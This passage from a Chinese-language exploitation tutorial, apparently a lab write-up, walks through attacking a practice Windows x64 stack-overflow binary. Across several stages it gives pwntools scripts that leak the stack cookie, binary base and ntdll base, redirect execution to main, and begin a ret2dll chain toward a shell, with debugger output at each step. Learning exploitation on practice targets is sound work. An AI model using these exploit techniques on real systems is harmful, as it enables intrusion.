0x100 </code>，所以编写poc泄露出<code>StackCookie</code></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'10.211.55.3'</span>, <span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">r.sendlineafter(<span class="string">'input:'</span>, p1)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line">r.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">StackCookie = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'StackCookie = '</span> + <span class="built_in">hex</span>(StackCookie))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><p>调试一下看一下泄露的是否正确</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dq rsp + <span class="number">0x130</span> - <span class="number">0x18</span></span><br><span class="line"><span class="number">00000057</span>`f0bcfc88  <span class="number">61616161</span>`<span class="number">61616161</span> <span class="number">00002447</span>`<span class="number">1</span>d701f43</span><br><span class="line"><span class="number">00000057</span>`f0bcfc98  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000185</span>`<span class="number">4b</span>f47480</span><br><span class="line"><span class="number">00000057</span>`f0bcfca8  <span class="number">00007f</span>f6`<span class="number">637112f</span>4 <span class="number">00000057</span>`f0bcfd10</span><br><span class="line"><span class="number">00000057</span>`f0bcfcb8  <span class="number">00007f</span>f6`<span class="number">6371136</span>d <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">00000057</span>`f0bcfcc8  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br></pre></td></tr></tbody></table></figure><p>可以看到<code>StackCookie</code>的值是<code>0x24471d701f43</code></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received <span class="number">0x119</span> bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">62</span> <span class="number">75</span> <span class="number">66</span> <span class="number">66</span>  <span class="number">65</span> <span class="number">72</span> <span class="number">3</span>a <span class="number">0</span>d  <span class="number">0</span>a <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │buff│er:·│·aaa│aaaa│</span><br><span class="line">    <span class="number">00000010</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    <span class="number">00000100</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">43</span> <span class="number">1f</span> <span class="number">70</span>  <span class="number">1</span>d <span class="number">47</span> <span class="number">24</span> <span class="number">0</span>d  │aaaa│aaaa│aC·p│·G$·│</span><br><span class="line">    <span class="number">00000110</span>  <span class="number">0</span>a <span class="number">69</span> <span class="number">6</span>e <span class="number">70</span>  <span class="number">75</span> <span class="number">74</span> <span class="number">3</span>a <span class="number">0</span>d  <span class="number">0</span>a                        │·inp│ut:·│·│</span><br><span class="line">    <span class="number">00000119</span></span><br><span class="line">StackCookie = <span class="number">0x24471d701f43</span></span><br></pre></td></tr></tbody></table></figure><p>poc里面<code>StackCookie</code>和上面调试的一样</p><h3 id="泄露binary-base"><a href="#泄露binary-base" class="headerlink" title="泄露binary base"></a>泄露binary base</h3><p>因为这个程序三次循环，只要最后的StackCookie正确就不会crash，所以第二次可以泄露出程序的基地址，也就是覆盖rbp，后面就会连带返回值一起泄露出来，poc如下</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'10.211.55.3'</span>, <span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p1)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">StackCookie = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'StackCookie = '</span> + <span class="built_in">hex</span>(StackCookie))</span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b'a'</span> * <span class="number">0x118</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span> ,p2)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x118</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'leak_addr = '</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><p>运行即可成功泄露出返回地址，此时就可以算出binary base</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'10.211.55.3'</span>, <span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p1)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">StackCookie = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'StackCookie = '</span> + <span class="built_in">hex</span>(StackCookie))</span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b'a'</span> * <span class="number">0x118</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span> ,p2)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x118</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'leak_addr = '</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">binary_base = leak_addr - <span class="number">0x12F4</span></span><br><span class="line">li(<span class="string">'binary_base = '</span> + <span class="built_in">hex</span>(binary_base))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><p>debug细节如下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received <span class="number">0x131</span> bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">62</span> <span class="number">75</span> <span class="number">66</span> <span class="number">66</span>  <span class="number">65</span> <span class="number">72</span> <span class="number">3</span>a <span class="number">0</span>d  <span class="number">0</span>a <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │buff│er:·│·aaa│aaaa│</span><br><span class="line">    <span class="number">00000010</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    <span class="number">00000120</span>  <span class="number">61</span> f4 <span class="number">12</span> <span class="number">4</span>c  <span class="number">0</span>c f6 <span class="number">7f</span> <span class="number">0</span>d  <span class="number">0</span>a <span class="number">69</span> <span class="number">6</span>e <span class="number">70</span>  <span class="number">75</span> <span class="number">74</span> <span class="number">3</span>a <span class="number">0</span>d  │a··L│····│·inp│ut:·│</span><br><span class="line">    <span class="number">00000130</span>  <span class="number">0</span>a                                                  │·│</span><br><span class="line">    <span class="number">00000131</span></span><br><span class="line">leak_addr = <span class="number">0x7ff60c4c12f4</span></span><br><span class="line">binary_base = <span class="number">0x7ff60c4c0000</span></span><br></pre></td></tr></tbody></table></figure><p>算出<code>binary_base = 0x7ff60c4c0000</code>，验证一下是否正确，直接看windbg前面的信息</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Executable search path is: </span><br><span class="line">ModLoad: <span class="number">00007f</span>f6`<span class="number">0</span>c4c0000 <span class="number">00007f</span>f6`<span class="number">0</span>c4c7000   Z:\easyoverflow\StackOverflow.exe</span><br><span class="line">ModLoad: <span class="number">00007f</span>f8`f3790000 <span class="number">00007f</span>f8`f3b86000   C:\Windows\SYSTEM32\ntdll.dll</span><br><span class="line">ModLoad: <span class="number">00007f</span>f8`f1eb0000 <span class="number">00007f</span>f8`f1fa4000   C:\Windows\System32\xtajit64.dll</span><br><span class="line">ModLoad: <span class="number">00007f</span>f8`f1020000 <span class="number">00007f</span>f8`f117c000   C:\Windows\System32\KERNEL32.DLL</span><br><span class="line">ModLoad: <span class="number">00007f</span>f8`ef810000 <span class="number">00007f</span>f8`efdf9000   C:\Windows\System32\KERNELBASE.dll</span><br><span class="line">ModLoad: <span class="number">00007f</span>f8`eedd0000 <span class="number">00007f</span>f8`eeea8000   C:\Windows\SYSTEM32\apphelp.dll</span><br><span class="line">ModLoad: <span class="number">00007f</span>f8`ef270000 <span class="number">00007f</span>f8`ef464000   C:\Windows\System32\ucrtbase.dll</span><br><span class="line">ModLoad: <span class="number">00007f</span>f8`e6e80000 <span class="number">00007f</span>f8`e6eb5000   C:\Windows\SYSTEM32\VCRUNTIME140.dll</span><br></pre></td></tr></tbody></table></figure><p>第二行就是binary的地址区间，基地址一样，证明poc正确</p><p>接下来需要打返回地址到main函数使得可以继续利用，值得注意的是因为到main函数之后栈会变，所以需要再次泄露出<code>StackCookie</code>，poc如下</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote('10.211.55.3', 1234)</span></span><br><span class="line">r = remote(<span class="string">'192.168.10.102'</span>, <span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p1)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">StackCookie = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'StackCookie = '</span> + <span class="built_in">hex</span>(StackCookie))</span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b'a'</span> * <span class="number">0x118</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span> ,p2)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x118</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'leak_addr = '</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">binary_base = leak_addr - <span class="number">0x12F4</span></span><br><span class="line">li(<span class="string">'binary_base = '</span> + <span class="built_in">hex</span>(binary_base))</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x1000</span> + binary_base</span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">p3 += p64(StackCookie)</span><br><span class="line">p3 += <span class="string">b'a'</span> * <span class="number">0x10</span></span><br><span class="line">p3 += p64(main_addr)</span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p3)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p1)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">StackCookie = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'StackCookie = '</span> + <span class="built_in">hex</span>(StackCookie))</span><br></pre></td></tr></tbody></table></figure><h3 id="ret2dll"><a href="#ret2dll" class="headerlink" title="ret2dll"></a>ret2dll</h3><p>接下来就可以利用ret2dll的方法来getshell，第一步泄露出dll_base，上一节已经学过了利用iat表来泄露出dll_base，但是这个程序是64位的，参数通过寄存器传递，顺序是 <code>rcx rdx r8 r9</code></p><p>所以笔者用Ropgadget找了一下发现gadgets很少几乎用不了</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  easyoverflow ROPgadget --binary StackOverflow.exe --only <span class="string">'pop|ret'</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x00000001400017ee</span> : pop rbp ; ret</span><br><span class="line"><span class="number">0x00000001400010c9</span> : pop rbx ; ret</span><br><span class="line"><span class="number">0x00000001400014ed</span> : pop rdi ; pop rsi ; pop rbx ; ret</span><br><span class="line"><span class="number">0x000000014000133d</span> : pop rdi ; ret</span><br><span class="line"><span class="number">0x00000001400014ee</span> : pop rsi ; pop rbx ; ret</span><br><span class="line"><span class="number">0x00000001400010ca</span> : ret</span><br><span class="line"><span class="number">0x0000000140001818</span> : ret <span class="number">0</span></span><br><span class="line"><span class="number">0x0000000140001723</span> : ret <span class="number">0x8348</span></span><br><span class="line"><span class="number">0x0000000140001643</span> : ret <span class="number">0xb70f</span></span><br><span class="line"><span class="number">0x0000000140001678</span> : ret <span class="number">0xeb28</span></span><br><span class="line"><span class="number">0x0000000140001d12</span> : ret <span class="number">3</span></span><br></pre></td></tr></tbody></table></figure><p>在CTF PWN中，可以通过泄露出libc然后用libc的gadgets，但是win下就不一样，因为没有可用的gadgets，所以需要借助ntdll.dll这个dll来寻找可用的gadgets，为什么是ntdll.dll呢，因为在main函数调用之前会调用ntdll.dll，所以可以泄露出这上面的地址，寻找一下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ModLoad: <span class="number">00007f</span>ff`<span class="number">2</span>da80000 <span class="number">00007f</span>ff`<span class="number">2</span>dc89000   C:\WINDOWS\SYSTEM32\ntdll.dll</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dq rsp + <span class="number">0x170</span></span><br><span class="line"><span class="number">00000010</span>`d33ffb88  <span class="number">61616161</span>`<span class="number">61616161</span> <span class="number">61616161</span>`<span class="number">61616161</span></span><br><span class="line"><span class="number">00000010</span>`d33ffb98  <span class="number">61616161</span>`<span class="number">61616161</span> <span class="number">61616161</span>`<span class="number">61616161</span></span><br><span class="line"><span class="number">00000010</span>`d33ffba8  <span class="number">61616161</span>`<span class="number">61616161</span> <span class="number">61616161</span>`<span class="number">61616161</span></span><br><span class="line"><span class="number">00000010</span>`d33ffbb8  <span class="number">00007f</span>ff`<span class="number">2</span>da8485b <span class="number">00000000</span>`<span class="number">00000000</span></span><br></pre></td></tr></tbody></table></figure><p>在<code>10d33ffba8</code>这里存放的地址就是ntdll.dll上的地址，算一下偏移在0x180，并且泄露的地址与base偏移为<code>0x485b</code>所以构造如下exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote('10.211.55.3', 1234)</span></span><br><span class="line">r = remote(<span class="string">'192.168.10.102'</span>, <span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p1)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">StackCookie = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'StackCookie = '</span> + <span class="built_in">hex</span>(StackCookie))</span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b'a'</span> * <span class="number">0x118</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span> ,p2)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x118</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'leak_addr = '</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">binary_base = leak_addr - <span class="number">0x12F4</span></span><br><span class="line">li(<span class="string">'binary_base = '</span> + <span class="built_in">hex</span>(binary_base))</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x1000</span> + binary_base</span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">p3 += p64(StackCookie)</span><br><span class="line">p3 += <span class="string">b'a'</span> * <span class="number">0x10</span></span><br><span class="line">p3 += p64(main_addr)</span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p3)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p1)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">StackCookie = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'StackCookie = '</span> + <span class="built_in">hex</span>(StackCookie))</span><br><span class="line"></span><br><span class="line">p4 = <span class="string">b'a'</span> * <span class="number">0x180</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p4)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x180</span>)</span><br><span class="line"></span><br><span class="line">ntdll_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'ntdll_addr = '</span> + <span class="built_in">hex</span>(ntdll_addr))</span><br><span class="line"></span><br><span class="line">ntdll_base = ntdll_addr - <span class="number">0x485b</span></span><br><span class="line">li(<span class="string">'ntdll_base = '</span> + <span class="built_in">hex</span>(ntdll_base))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><p>输出的地址正确，因为有aslr的存在，所以地址肯定是随机的，这就造成了上面有时候地址不一样，需要注意的是这里笔者换成了实机，因为arm windows11支持了x64的程序</p><blockquote><p>相应的x64程序的公用DLL和ARM64程序使用的公用DLL一样都会存放在System32目录下。实际上，原来的ARM64系统DLL都已经进化成ARM64x ABI的混合DLL，这些DLL中的机器码主要仍是ARM64 native的，ARM64程序仍然能以最高效率调用里面导出的函数。同时增加了对x64程序基于JIT指令转译模拟执行时调用相关导出函数的支持，主要是将x64调用约定转换为对相应的ARM64函数的调用，执行结果处理则反之。这样可以提高执行效率，因为如果直接使用自Win10 x64版本的System32目录复制过来的x64 DLL的话，DLL中的机器码也需要指令转译，从而影响了执行效率。可能有点像Win10 on ARM下执行x86程序时调用系统常用的DLL使用SyChpe32中的CHPE DLL以提高执行效率的策略。</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received <span class="number">0x193</span> bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">3</span>a <span class="number">0</span>d <span class="number">0</span>a <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │:··a│aaaa│aaaa│aaaa│</span><br><span class="line">    <span class="number">00000010</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    <span class="number">00000180</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">5b</span>  <span class="number">48</span> a8 <span class="number">2</span>d ff  <span class="number">7f</span> <span class="number">0</span>d <span class="number">0</span>a <span class="number">69</span>  <span class="number">6</span>e <span class="number">70</span> <span class="number">75</span> <span class="number">74</span>  │aaa[│H·-·│···i│nput│</span><br><span class="line">    <span class="number">00000190</span>  <span class="number">3</span>a <span class="number">0</span>d <span class="number">0</span>a                                            │:··│</span><br><span class="line">    <span class="number">00000193</span></span><br><span class="line">ntdll_addr = <span class="number">0x7fff2da8485b</span></span><br><span class="line">ntdll_base = <span class="number">0x7fff2da80000</span></span><br></pre></td></tr></tbody></table></figure><p>拿到ntdll的地址之后寻找需要用的gadgets，也就是能控制rcx的还有rbx，为什么还有个rbx，看下面的汇编</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span 